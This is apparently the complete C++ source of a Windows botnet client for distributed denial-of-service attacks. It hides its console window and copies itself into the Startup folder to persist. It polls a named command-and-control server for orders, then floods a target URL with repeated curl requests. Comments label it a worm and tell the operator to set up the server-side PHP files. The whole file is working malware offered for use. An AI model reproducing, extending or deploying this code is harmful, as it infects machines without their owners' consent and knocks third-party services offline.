#include <bits/stdc++.h>
#include <windows.h>
#include <unistd.h>
// Replace It with the server link or IP where PHP server is running
// The PHP files to put on server is in server directory.
#define SERVER_URL "zombie-ddos.herokuapp.com"

using namespace std;
void runInBackground();
void saveStartup();
string makeRequest(string method, string uri);
void startDDOS(string link, string iterations);
string randomString(int n);

string link;
string iterations;
string bot_id;

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main()
{	
	string attackFlag;
	bot_id = randomString(6);
		
	// Run process in background
	runInBackground();
	
	// Save to startup
	saveStartup();

	// Life of worm begins here
	while(1) {
		attackFlag = makeRequest("GET", "attack.php?bot_id=" + bot_id);
		if(attackFlag == "1") {
			link		=	makeRequest("GET", "link.php");
			iterations	=	makeRequest("GET", "itr.php");
			startDDOS(link, iterations);
		}
		if(attackFlag != "1")
			sleep(180);
	}
	
	return 0;
}

/*
* =======================================================================================
* RUN AS BACKGROUND PROCESS -> return void
* =======================================================================================
*/
void runInBackground()
{
	HWND window;
	AllocConsole();
	window	=	FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}


/*
* =======================================================================================
* SAVE TO STARTUP FOLDER -> return void
* =======================================================================================
*/
void saveStartup()
{
		string startup_directory			=	"\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
		string dir_place_worm				=	startup_directory + "\\bot.exe";
		string cmd_copy_worm_startup		=	"xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
		const char *cmd_copy_worm_startup_p	=	cmd_copy_worm_startup.c_str();
		
		system(cmd_copy_worm_startup_p);
}


/*
* =======================================================================================
* DDOS ATTACK FUNCTION -> return void
* =======================================================================================
*/
void startDDOS(string link, string iterations)
{	
	string ddos_cmd			=	"curl -s \"" + link + "?[0-" + iterations + "]\"";
	const char *ddos_cmd_p	=	ddos_cmd.c_str();
		
	system(ddos_cmd_p);
}


/*
* =======================================================================================
* MAKE REQUEST FUNCTION -> returns response string
* =======================================================================================
*/
string makeRequest(string method, string uri)
{
		string retval;
		string cmd_for_get_request			=	"curl -X "
												+ method
												+ " " + SERVER_URL +"/"
												+ uri;
		const char *cmd_for_get_request_p	=	cmd_for_get_request.c_str();
		
		return exec(cmd_for_get_request_p);
}


/*
* =======================================================================================
* -----------------------------UTIL FUNCTIONS HERE ONLY----------------------------------
* =======================================================================================
*/
string randomString(int n) 
{ 
    char alphabet[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 
                          'h', 'i', 'j', 'k', 'l', 'm', 'n',  
                          'o', 'p', 'q', 'r', 's', 't', 'u', 
                          'v', 'w', 'x', 'y', 'z' }; 
  
    string res = ""; 
    for (int i = 0; i < n; i++)  
        res = res + alphabet[rand() % 26]; 
      
    return res; 
}
